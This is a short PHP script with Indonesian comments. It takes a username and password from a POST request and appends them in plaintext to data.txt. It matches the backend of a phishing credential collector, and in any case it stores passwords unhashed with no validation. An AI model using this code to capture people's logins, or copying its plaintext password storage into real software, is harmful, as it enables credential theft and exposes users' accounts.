<?php
// Mengecek apakah data dikirim melalui POST
if ($_SERVER["REQUEST_METHOD"] === "POST") {
    $username = $_POST["username"];
    $password = $_POST["password"];
    
    // Menyimpan data ke dalam file data.txt
    $file = fopen("data.txt", "a"); // "a" untuk menambahkan data di akhir file
    fwrite($file, "Username: $username | Password: $password\n");
    fclose($file);
    
    // Memberikan respons ke pengguna
    echo "Data berhasil disimpan.";
} else {
    echo "Invalid Request.";
}
?>